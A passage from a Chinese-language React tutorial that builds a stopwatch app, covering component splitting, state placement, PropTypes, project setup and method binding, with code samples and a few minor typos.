&lt;ControlButtons&gt;</span><br><span class="line">          &lt;SplitTimes&gt;</span><br><span class="line">       &lt;/div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">const MajorClock = (props) =&gt; &#123;</span><br><span class="line">  //TODO: 返回数字时钟的JSX</span><br><span class="line">&#125;;</span><br><span class="line">const ControlButtons = (props) =&gt; &#123;</span><br><span class="line">  //TODO: 返回两个按钮的JSX</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">const SplitTimes = (props) =&gt; &#123;</span><br><span class="line">  //TODO: 返回所有计次时间的JSX</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br /> 初始化 <code>MajorClock</code>、<code>ControlButtons</code> 和 <code>SplitTimes</code> 这三个组件，目前，并不知道它们是否应该有自己的 <code>state</code>，但是从简单开始，首先假设它们没有自己的 <code>state</code>，定义为函数形式的无状态组件。</p><p><a name="O3g5J"></a></p><h3 id="（3）按照数据边界来分割组件"><a href="#（3）按照数据边界来分割组件" class="headerlink" title="（3）按照数据边界来分割组件"></a>（3）按照数据边界来分割组件</h3><p>现在，来看一下这样的组件划分是否符合“<strong>按照数据边界划分</strong>”的原则：<br />● 渲染 <code>MajorClock</code>，需要的是当前展示的时间，在点击“启动”按钮之后，这个时间是不断增长的。<br />● 渲染 <code>ControlButtons</code>，两个按钮显示什么内容，完全由当前是否是“启动”的激活状态决定。此外，Buttons 是秒表中唯一有用户输入的组件，对于按钮的按键会改变秒表的状态。<br />● 计次时间 <code>SplitTimes</code>，需要渲染多个时间，可以想象，需要有一个数组来记录所有计次时间。</p><p>总结一下所有需要的数据和对应标识符，以及影响的组件：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1690176091382-dfe50bb8-1314-4276-9a3f-9d7411fe1c42.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1690176091382-dfe50bb8-1314-4276-9a3f-9d7411fe1c42.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />从表格可以看出，每个数据影响的组件都不多，唯一影响两个组件的数据是 <code>activated</code>，这个 <code>activated</code> 基本上就是一个布尔值，数据量很小，影响两个组件问题也不大。这样的组件划分是符合以数据为边界原则的。</p><p><a name="YtXCG"></a></p><h3 id="（4）state-的位置"><a href="#（4）state-的位置" class="headerlink" title="（4）state 的位置"></a>（4）state 的位置</h3><p>接下来，需要确定 <code>state</code> 的存储位置。当秒表处于启动状态，<code>MajorClock</code> 会不断更新时间，似乎让 <code>MajorClock</code> 来存储时间相关的 <code>state</code> 很合理，但是仔细考虑一下，就会发现这样并不合适。</p><p>设想一下，<code>MajorClock</code> 包含一个 <code>state</code> 记录时间，因为 <code>state</code> 是组件的内部状态，只能通过组件自己来更新，所以要 <code>MajorClock</code> 用一个 <code>setTimeout</code> 或者 <code>setInterval</code> 来持续更新这个 <code>state</code>，可是，另一个组件 <code>ControlButtons</code> 将会决定什么时候暂停 <code>MajorClock</code> 的 <code>state</code> 更新，而且，当用户按下“计次“按钮的时候，<code>MajorClock</code> 还需要一个方法把当前的时间通知给 <code>SplitTimes</code> 组件。这样一个数据传递过程，想一想都觉得很麻烦，明显不合适。</p><p>这时候就需要考虑这样的原则，<strong>尽量把数据状态往上层组件提取</strong>。在秒表这个应用中，上层组件就是 <code>StopWatch</code>，如果让 <code>StopWatch</code> 来存储时间状态，就会简单很多。<code>StopWatch</code> 中利用 <code>setTimeout</code> 或者 <code>setInterval</code> 来更新 <code>state</code>，每一次更新会引发一次重新渲染，在重新渲染的时候，直接把当前时间值传递给 <code>MajorClock</code> 就完事了。</p><p>至于 <code>ControlButtons</code> 对状态的控制，让 <code>StopWatch</code> 传递函数类型 <code>props</code> 给 <code>ControlButtons</code>，当特定按钮时间点击的时候回调这些函数，<code>StopWatch</code> 就知道何时停止更新或者启动 <code>setTimeout</code> 或者 <code>setInterval</code>，因为这一切逻辑都封装在 <code>StopWatch</code> 中，非常直观自然。</p><p>除此之外，还有 <code>SplitTimes</code>，它需要一个数组记录所有计次时间，这些数据也很自然应该放在 <code>StopWatch</code> 中维护，然后通过 <code>props</code> 传递给 <code>SplitTimes</code>，这样 <code>SplitTimes</code> 只单纯做渲染就足够。</p><p><a name="aii5a"></a></p><h3 id="（5）组件-props-的设计"><a href="#（5）组件-props-的设计" class="headerlink" title="（5）组件 props 的设计"></a>（5）组件 props 的设计</h3><p>当确定了组件结构和 <code>state</code> 之后，最后要做的就是设计 <code>props</code>。</p><p>先来看 <code>MajorClock</code>，因为它依赖的数据只有当前时间，所以只需要一个 <code>props</code>。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">MajorClock</span> = (<span class="params">&#123;milliseconds&#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">//<span class="doctag">TODO:</span> 返回数字时钟的JSX</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">MajorClock</span>.<span class="property">propTypes</span> = &#123;</span><br><span class="line">  <span class="attr">milliseconds</span>: <span class="title class_">PropTypes</span>.<span class="property">number</span>.<span class="property">isRequired</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />和函数参数的命名一样，<code>props</code>的命名一定力求简洁而且清晰。对于<code>MajorClock</code>，如果把这个<code>props</code>命名为 <code>time</code>，很容易引起歧义，这个 <code>time</code> 的单位是什么？是毫秒？还是秒？还是一个 <code>Date</code> 对象？</p><p>所以，明确传入的 <code>props</code> 是一个代表毫秒的数字，所以命名为 <code>milliseconds</code>。</p><p>然后是 <code>ControlButtons</code>，这个组件需要根据当前是否是“启动”状态显示不同的按钮，所以需要一个 props 来表示是否“启动”，把它命名为 <code>activated</code>。</p><p>此外，<code>StopWatch</code> 还需要传递回调函数给 <code>ControlButtons</code>，所以还需要支持函数类型的 <code>props</code>，分别代表 <code>ControlButtons</code> 可以做的几个动作：<br />● 启动（start）<br />● 停止（pause）<br />● 计次（split）<br />● 复位（reset）</p><p>一般来说，为了让开发者能够一眼认出回调函数类型的 <code>props</code>，这类 <code>props</code> 最好有一个统一的前缀，比如 <code>on</code> 或者 <code>handle</code> 。所以，<code>ControlButtons</code> 的接口就可以是下面这样：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">ControlButtons</span> = (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">//<span class="doctag">TODO:</span> 返回两个按钮的JSX</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">ControlButtons</span>.<span class="property">propTypes</span> = &#123;</span><br><span class="line">  <span class="attr">activated</span>: <span class="title class_">PropTypes</span>.<span class="property">bool</span>,</span><br><span class="line">  <span class="attr">onStart</span>: <span class="title class_">PropTypes</span>.<span class="property">func</span>.<span class="property">isRquired</span>,</span><br><span class="line">  <span class="attr">onPause</span>: <span class="title class_">PropTypes</span>.<span class="property">func</span>.<span class="property">isRquired</span>,</span><br><span class="line">  <span class="attr">onSplit</span>: <span class="title class_">PropTypes</span>.<span class="property">func</span>.<span class="property">isRquired</span>,</span><br><span class="line">  <span class="attr">onReset</span>: <span class="title class_">PropTypes</span>.<span class="property">func</span>.<span class="property">isRquired</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />最后是 <code>SplitTimes</code>，它需要接收一个数组类型的 <code>props</code>。<code>PropTypes</code> 也可以支持数组类型的定义：<br />至此，就完成了秒表的组件接口设计。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">SplitTimes</span> = (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">//<span class="doctag">TODO:</span> 返回所有计次时间的JSX</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">SplitTimes</span>.<span class="property">propTypes</span> = &#123;</span><br><span class="line">  <span class="attr">splits</span>: <span class="title class_">PropTypes</span>.<span class="title function_">arrayOf</span>(<span class="title class_">PropTypes</span>.<span class="property">number</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a name="dIGkL"></a></p><h2 id="2-组件内部实现"><a href="#2-组件内部实现" class="headerlink" title="2. 组件内部实现"></a>2. 组件内部实现</h2><p>下面来具体实现一下秒表应用，目标如下：<br />● 功能正常<br />● 代码整洁<br />● 高性能</p><p><a name="mkh83"></a></p><h3 id="（1）初始化应用框架"><a href="#（1）初始化应用框架" class="headerlink" title="（1）初始化应用框架"></a>（1）初始化应用框架</h3><p>使用 React 提供的 <code>create-react-app</code> 来创建秒表应用。可以使用下面的命令来全局安装：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g create-react-app</span><br></pre></td></tr></table></figure><p><br />使用下面的命令来创建应用框架，在这里应用名字叫 <code>basic_stop_watch</code>。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create-react-app basic_stop_watch --use-npm</span><br></pre></td></tr></table></figure><p><br />在完成之后，会创建一个 <code>basic_stop_watch</code> 目录，进入这个目录，运行下面给的命令，就可以启动应用：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure><p><a name="t51jf"></a></p><h3 id="（2）构建-StopWatch"><a href="#（2）构建-StopWatch" class="headerlink" title="（2）构建 StopWatch"></a>（2）构建 StopWatch</h3><p>上面已经确定了要用四个组件组合来实现“秒表”，这四个组件分别是 <code>StopWatch</code>、<code>MajorClock</code>、<code>ControlButtons</code> 和 <code>SplitTimes</code>。</p><p>为了达到“代码整洁”的目的，我们让每个组件都有一个独立的文件，然后这个文件用 <code>export default</code> 的方式导出单个组件。</p><p>比如，在 <code>src</code> 目录下为 <code>ControlButtons</code> 创建一个 <code>ControlButtons.js</code> 文件，最初内容像下面这样：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">ControlButtons</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">//<span class="doctag">TODO:</span> 实现ControlButtons</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">ControlButtons</span>;</span><br></pre></td></tr></table></figure><p><br />第一行导入 React，因为任何 JSX 都需要 React。最后一行用 <code>export default</code> 的方式导出 <code>ControlButtons</code>，这样，在其他组件中就可以用下面的方式导入：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">ControlButtons</span> <span class="keyword">from</span> <span class="string">&#x27;./ControlButtons&#x27;</span>;</span><br></pre></td></tr></table></figure><p><br />我们知道，<code>ControlButtons</code> 可以接受的 <code>props</code>，其实现代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">ControlButtons</span> = (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;activated, onStart, onPause, onReset, onSplit&#125; = props;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &#123;activated ? (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;onSplit&#125;</span>&gt;</span>计次<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;onPause&#125;</span>&gt;</span>停止<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    ) : (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;onReset&#125;</span>&gt;</span>复位<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;onStart&#125;</span>&gt;</span>启动<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )&#125;</span><br><span class="line">  )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />这里用到了 <code>ES6</code> 中的<strong>解构赋值</strong>（Destructuring Assignment）。因为 <code>ControlButtons</code> 是一个函数类型的组件，所以 <code>props</code> 以参数形式传递进来，<code>props</code> 中的属性包含 <code>activated</code> 这样的值，利用大括号，就可以完成对 <code>props</code> 的“解构”，把 <code>props.activated</code> 赋值给同名的变量 <code>activated</code>。</p><p>可以更进一步地把解构赋值提到参数中，这样连 <code>props</code> 的对象都看不见：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">ControlButtons</span> = (<span class="params">&#123;activated, onStart, onPause, onReset, onSplit&#125;</span>) =&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />在 <code>ControlButtons</code> 的实现部分，根据 <code>activated</code> 的值返回不同的 JSX，当 <code>activated</code> 为 <code>true</code> 时，返回的是“计次”和“停止”；当 <code>activated</code> 为 <code>false</code> 时，返回的是“复位”和“启动”，对应分别使用了传入的 <code>on</code> 开头的函数类型 <code>props</code>。</p><p>可以看到，<code>ControlButtons</code> 除了显示内容和分配 <code>props</code>，没有做什么实质的工作。</p><p>接下来实现 <code>MajorClock</code> 组件，根据传入 <code>props</code> 的 <code>milliseconds</code> 来显示数字时钟一样的时分秒。在 <code>MajorClock.js</code> 文件中，我们这样定义 <code>MajorClock</code>：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">MajorClock</span> = (<span class="params">&#123;milliseconds=<span class="number">0</span>&#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;ms2Time(milliseconds)&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />在这里还使用了默认值。如果使用 <code>MajorClock</code> 时没有传入 <code>milliseconds</code> 这个 <code>props</code>，那么 <code>milliseconds</code> 的值就是 0。<br />因为把毫秒数转为 <code>HH:mm:ss:mmm</code> 这样的格式和 JSX 没什么关系，所以，不在组件中直接编写，而是放在 <code>ms2Time</code> 函数中，<code>ms2Time</code> 就是 <code>ms-to-Time</code>，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> padStart <span class="keyword">from</span> <span class="string">&#x27;lodash/padStart&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">ms2Time</span> = (<span class="params">milliseconds</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> time = milliseconds;</span><br><span class="line">  <span class="keyword">const</span> ms = milliseconds % <span class="number">1000</span>;</span><br><span class="line">  time = (milliseconds - ms) / <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">const</span> seconds = time % <span class="number">60</span>;</span><br><span class="line">  time = (time - seconds) / <span class="number">60</span>;</span><br><span class="line">  <span class="keyword">const</span> minutes = time % <span class="number">60</span>;</span><br><span class="line">  <span class="keyword">const</span> hours = (time - minutes) / <span class="number">60</span>;</span><br><span class="line">  <span class="keyword">const</span> result = <span class="title function_">padStart</span>(hours, <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>) + <span class="string">&quot;:&quot;</span> + <span class="title function_">padStart</span>(minutes, <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>) + <span class="string">&quot;:&quot;</span> + <span class="title function_">padStart</span>(seconds, <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>) + <span class="string">&quot;.&quot;</span> + <span class="title function_">padStart</span>(ms, <span class="number">3</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />通过逐步从 <code>milliseconds</code> 中抽取毫秒、秒、分、时的信息，最终拼出正确的时间。不过，为了和数字时钟显示一致，需要补齐，比如 2 秒 23 毫秒，显示成 2:23 可不好看，不够的位数要补上 0，显示成 00:00:02:023 。这个补齐可以使用 lodash 中的 <code>padStart</code> 实现。为了在项目中使用 lodash，需要用 npm 完成对应的库安装。</p><p>最后是 <code>SplitTimes</code> 这个组件，在 <code>SplitTimes.js</code> 这个文件中，需要这样定义 <code>SplitTimes</code>：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">MajorClock</span> <span class="keyword">from</span> <span class="string">&#x27;./MajorClock&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">SplitTimes</span> = (<span class="params">&#123;value=[]&#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> value.<span class="title function_">map</span>(<span class="function">(<span class="params">v, k</span>) =&gt;</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">MajorClock</span> <span class="attr">key</span>=<span class="string">&#123;k&#125;</span> <span class="attr">milliseconds</span>=<span class="string">&#123;v&#125;</span> /&gt;</span></span></span><br><span class="line">  ));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />因为根据毫秒数显示数字时钟的功能在 <code>MajorClock</code> 中已经做到了，所以直接导入 <code>MajorClock</code> 使用就好，这符合“重用代码”的原则。</p><p><strong>利用循环或者数组 map 而产生的动态数量的 JSX 元件</strong>，必须要有 key 属性。这个 key 属性帮助 React 搞清楚组件的顺序，如果不用 key，那 React 会在开发模式下在 console 上输出红色警告。</p><p><strong>注意：</strong>key 不应该取数组的序号，因为 key 要唯一而且稳定，也即是每一次渲染过程中，key 都能唯一标识一个内容。但是，对于 StopWatch 这个例子，可以直接使用数组序号，因为计次时间的数组顺序不会改变，使用数组序号足够唯一标识内容。</p><p><a name="NKwHU"></a></p><h3 id="（3）StopWatch-状态管理"><a href="#（3）StopWatch-状态管理" class="headerlink" title="（3）StopWatch 状态管理"></a>（3）StopWatch 状态管理</h3><p>在实现了 <code>MajorClock</code>、<code>ControlButtons</code> 和 <code>SplitTimes</code> 之后，我们需要把这些子组件串起来，这就是 <code>StopWatch</code>。<br /><code>StopWatch</code> 是一个有状态的组件，所以，不能只用一个函数实现，而是做成一个继承自 <code>React.Component</code> 的类：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StopWatch</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">Fragment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">MajorClock</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">ControlButtons</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">SplitTimes</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Fragment</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />对于一个 React 组件类，最少要有一个 <code>render</code> 函数实现，不过，上面的 <code>render</code> 只是一个大概的代码框架，引用了相关子组件，但是没有传入 <code>props</code>。</p><p>传入的 <code>props</code> 就是 <code>StopWatch</code> 记录的 <code>state</code>。<code>StopWatch</code> 的 <code>state</code> 需要有这些信息：<br />● <code>isStarted</code>，是否开始计时；<br />● <code>startTime</code>，计时开始时间，Date 对象；<br />● <code>currentTime</code>，当前时间，也是 Date 对象；<br />● <code>splits</code>，所有计次时间的数组，每个元素是一个毫秒数。</p><p>React 组件的 state 需要初始化，一般来说，初始化 state 是在构造函数中：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">super</span>(...<span class="variable language_">arguments</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">    <span class="attr">isStarted</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">startTime</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">currentTime</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">splits</span>: [],</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br /> 如果定义构造函数 <code>constructor</code>，需要通过 <code>super</code> 调用父类 <code>React.Component</code> 的构造函数，不然，功能会不正常。React 官方网站上的代码示例是这样调用 super 函数：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props); <span class="comment">//目前可行，但有更好的方法</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><br />在早期版本中，<code>React.Component</code> 的构造函数参数有两个，第一个是 <code>props</code>，第二个是 <code>context</code>，如果忽略掉 <code>context</code> 参数，那么这个组件的 <code>context</code> 功能就不能正常工作，不过，现在 React 的行为已经变了，第二个参数传递不传递都能让<code>context</code>正常工作，看起来<code>React.Component</code> 的构造函数只有第一个参数被用到，但是，没准未来还会增加新的参数呢，所以，以不变应万变的方法，就是使用扩展操作符（spread operator）来展开 <code>arguments</code>，这样不管 React 将来怎么变，这样的代码都正确。<br /></p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">super</span>(...<span class="variable language_">arguments</span>); <span class="comment">//永远正确！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />扩展操作符的作用，在 React 开发中会经常用到，在 JSX 中展开 props 的时候会用到。<br><a name="auoiZ"></a></p><h3 id="（4）属性初始化方法"><a href="#（4）属性初始化方法" class="headerlink" title="（4）属性初始化方法"></a>（4）属性初始化方法</h3><p>其实我可以不写 <code>constructor</code> 函数，而直接使用属性初始化（Property Initializer），也就是在 <code>class</code> 定义中直接初始化类的成员变量。效果是完全一样的：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StopWatch</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    <span class="attr">isStarted</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">startTime</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">currentTime</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">splits</span>: [],</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />接下来实现传递给 <code>ControlButtons</code> 的一系列函数。需要注意，在实际工作中，在 JSX 中应用的函数 props 应该尽量使用类成员函数，不要用内联函数。</p><p>以最 <code>onSplit</code> 为例，这个函数响应用户点击“计次”按钮的事件，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onSplit</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">    <span class="attr">splits</span>: [...<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">splits</span>, <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">currentTime</span> - <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">startTime</span>]</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />在 <code>onSplit</code> 中，利用 <code>this.setState</code> 来修改组件的状态。那这个函数执行时，<code>this</code> 是什么呢？对于 <code>ES6</code> 的类成员函数，并不自动绑定 <code>this</code>，也就是说，<code>onSplit</code> 中的 <code>this</code>，可不保证就是当前组件对象。至于 <code>render</code> 这些生命周期函数，里面访问的 <code>this</code> 就是当前组件本身，完全是因为这些函数是 React 调用的，React 对它们进行了特殊处理，对于其他普通的成员函数，特殊处理就要靠我们自己了。</p><p>通常的处理方法，就是在构造函数中对函数进行绑定，然后把新产生的函数覆盖原有的函数，就像这样：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">super</span>(...<span class="variable language_">arguments</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">onSplit</span> = <span class="variable language_">this</span>.<span class="property">onSplit</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br /><code>StopWatch</code> 需要给 <code>ControlButtons</code> 传递四个函数类型的 <code>props</code>，分别是 <code>onStart</code>、<code>onPause</code>、<code>onReset</code> 和 <code>onSplit</code>，对每一个函数都在构造函数里加一个 <code>bind</code>很容易出错。更好的方法依然是使用属性初始化，就和初始化 <code>state</code> 一样，利用<strong>等号</strong>直接初始化</p><p><code>StopWatch</code> 需要给 <code>ControlButtons</code> 传递四个函数类型的 <code>props</code>，分别是 <code>onStart</code>、<code>onPause</code>、<code>onReset</code> 和 <code>onSplit</code>，对每一个函数都在构造函数里加一个 <code>bind</code> 很容易出错，更好的方法依然是使用属性初始化，就和初始化 <code>state</code> 一样，利用<strong>等号直接初始化</strong> <code>onSplit</code>，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">onSplit = <span class="function">() =&gt;</span> 